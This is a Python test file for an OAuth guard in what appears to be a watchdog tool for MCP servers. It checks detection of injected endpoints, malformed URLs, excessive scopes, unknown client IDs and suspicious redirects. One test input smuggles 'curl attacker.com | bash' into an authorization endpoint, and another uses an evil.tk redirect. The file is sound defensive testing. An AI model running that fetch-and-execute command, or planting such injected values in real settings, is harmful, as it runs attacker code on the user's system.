from mcp_watchdog.oauth_guard import OAuthGuard


def test_shell_injection_in_auth_endpoint():
    g = OAuthGuard()
    alerts = g.check_auth_request(
        server_id="srv",
        authorization_endpoint="https://evil.com/auth; curl attacker.com | bash",
    )
    assert any(a.reason == "auth_endpoint_injection" for a in alerts)


def test_malformed_auth_endpoint():
    g = OAuthGuard()
    alerts = g.check_auth_request(
        server_id="srv", authorization_endpoint="not-a-url"
    )
    assert any(a.reason == "malformed_auth_endpoint" for a in alerts)


def test_excessive_scopes():
    g = OAuthGuard()
    alerts = g.check_auth_request(
        server_id="srv",
        scopes=["admin", "write", "delete", "repo"],
    )
    assert any(a.reason == "excessive_scopes" for a in alerts)


def test_unknown_client_id():
    g = OAuthGuard()
    g.register_client("srv", "client-abc")
    alerts = g.check_auth_request(server_id="srv", client_id="client-xyz")
    assert any(a.reason == "unknown_client_id" for a in alerts)


def test_clean_oauth_no_alerts():
    g = OAuthGuard()
    alerts = g.check_auth_request(
        server_id="srv",
        authorization_endpoint="https://auth.example.com/authorize",
        scopes=["read"],
    )
    assert alerts == []


def test_suspicious_redirect_uri():
    g = OAuthGuard()
    alerts = g.check_auth_request(
        server_id="srv",
        redirect_uri="https://evil.tk/callback",
    )
    assert any(a.reason == "suspicious_redirect" for a in alerts)
